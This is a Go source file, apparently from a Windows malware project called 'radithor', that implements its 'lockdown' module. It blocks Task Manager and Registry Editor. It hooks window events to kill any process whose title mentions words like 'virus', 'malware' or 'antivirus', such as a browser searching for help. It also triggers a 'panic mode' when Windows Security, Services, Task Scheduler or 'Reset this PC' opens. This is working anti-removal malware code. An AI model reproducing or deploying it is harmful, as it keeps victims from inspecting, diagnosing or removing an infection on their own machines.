package lockdown

import (
	"fmt"
	"runtime"
	"slices"
	"strings"
	"syscall"

	"radithor/core"
	"radithor/funcs"
	"radithor/store"
	"radithor/utils"

	"github.com/horobimasu/windowsx"
	"golang.org/x/sys/windows"
)

var ProcsToBlock = []string{
	"Taskmgr.exe",
	"regedit.exe",
}

// the words in the window text to detect when it changes
// browsers like to change it to what is being searched
var TitleChangesToDetect = []string{
	"virus",
	"malware",
	"trojan",
	"trogen",
	"trojen",
	"rat",
	"antivirus",
	"antimalware",
}

var TitlesToDetect = []string{
	"reset this pc",       // Reset this PC, SystemSettingsAdminFlows.exe
	"services",            // Services, mmc.exe
	"system and security", // System and Security, explorer.exe
	"task scheduler",      // Task Scheduler, mmc.exe
	"task manager",        // Task Manager, Taskmgr.exe
	"windows security",    // Windows Security, ApplicationFrameHost.exe
	"registry editor",     // Registry Editor, regedit.exe
}

var ProcsToDetect = []string{
	"sechealthui.exe", // SecHealthUI.exe
}

var (
	windowTextChangeHookThread uint32

	onWindowTextChange = syscall.NewCallback(func(
		hook uintptr,
		event uintptr,
		handle uintptr,
		object uintptr,
		child uintptr,
		thread uintptr,
		time uintptr,
	) uintptr {
		if int32(object) != 0 {
			return 0
		}

		title, err := windowsx.GetWindowText(handle)
		if err != nil {
			return 0
		}

		var detected bool

		title = strings.ToLower(title)
		for _, word := range strings.Fields(title) {
			if slices.Contains(TitleChangesToDetect, word) {
				detected = true
				break
			}
		}

		if !detected {
			return 0
		}

		var pid uint32
		windows.GetWindowThreadProcessId(windows.HWND(handle), &pid)

		err = utils.TerminateProc(pid)
		if err != nil {
			panicModeCallback()
			return 0
		}

		if store.DEBUG_MODE_ENABLED {
			windows.MessageBox(
				windows.HWND(uintptr(0)),
				windows.StringToUTF16Ptr(fmt.Sprintf("panic mode killed process with pid %d because title was %q", pid, title)),
				windows.StringToUTF16Ptr("radithor debug mode"),
				windows.MB_OK|windows.MB_ICONINFORMATION,
			)
		}

		return 0
	})
)

var (
	windowCreateHookThread uint32

	onWindowCreate = syscall.NewCallback(func(
		hook uintptr,
		event uintptr,
		handle uintptr,
		object uintptr,
		child uintptr,
		thread uintptr,
		time uintptr,
	) uintptr {
		if int32(object) != 0 {
			return 0
		}

		var pid uint32
		windows.GetWindowThreadProcessId(windows.HWND(handle), &pid)

		name, err := utils.GetProcNameFromPid(pid)
		if err == nil && slices.Contains(ProcsToDetect, strings.ToLower(name)) {
			panicModeCallback() // no point even trying to terminate since im pretty sure they are protected
			return 0
		}

		titles, err := utils.GetWindowTitlesFromPid(pid)
		if err != nil {
			return 0
		}

		var detected bool

		for _, title := range titles {
			title = strings.ToLower(title)

			if slices.Contains(TitlesToDetect, title) {
				detected = true
				break
			}
		}

		if !detected {
			return 0
		}

		panicModeCallback() // same here

		return 0
	})
)

func BlockManagementProcs() {
	for _, proc := range ProcsToBlock {
		funcs.BlockProcess(proc)
	}
}

func UnblockManagementProcs() {
	for _, proc := range ProcsToBlock {
		funcs.UnblockProcess(proc)
	}
}

func EnableWindowTextChangeDetection() {
	go func() {
		runtime.LockOSThread()

		var msg windowsx.Msg
		windowsx.PeekMessage(&msg, 0, _WM_USER, _WM_USER, windowsx.PM_NOREMOVE)

		windowTextChangeHookThread = windows.GetCurrentThreadId()

		hook, err := windowsx.SetEventHook(
			windowsx.EVENT_OBJECT_NAMECHANGE,
			windowsx.EVENT_OBJECT_NAMECHANGE,
			0,
			onWindowTextChange,
			0,
			0,
			windowsx.WINEVENT_OUTOFCONTEXT,
		)

		if err != nil {
			core.LogError("[EnableWindowTextChangeDetection] failed to set hook")
			return
		}

		for {
			ret, _ := windowsx.GetMessage(&msg, 0, 0, 0)
			if ret <= 0 {
				break
			}
		}

		windowsx.UnhookEvent(hook)
	}()
}

func DisableWindowTextChangeDetection() {
	windowsx.PostThreadMessage(windowTextChangeHookThread, _WM_QUIT, 0, 0)
}

// this detects the ProcsToDetect too since its the same hook
func EnableWindowTitleDetection() {
	go func() {
		runtime.LockOSThread()

		var msg windowsx.Msg
		windowsx.PeekMessage(&msg, 0, _WM_USER, _WM_USER, windowsx.PM_NOREMOVE)

		windowCreateHookThread = windows.GetCurrentThreadId()

		hook, err := windowsx.SetEventHook(
			windowsx.EVENT_OBJECT_CREATE,
			windowsx.EVENT_OBJECT_CREATE,
			0,
			onWindowCreate,
			0,
			0,
			windowsx.WINEVENT_OUTOFCONTEXT,
		)

		if err != nil {
			core.LogError("[EnableWindowTitleDetection] failed to set hook")
			return
		}

		for {
			ret, _ := windowsx.GetMessage(&msg, 0, 0, 0)
			if ret <= 0 {
				break
			}
		}

		windowsx.UnhookEvent(hook)
	}()
}

func DisableWindowTitleDetection() {
	windowsx.PostThreadMessage(windowCreateHookThread, _WM_QUIT, 0, 0)
}
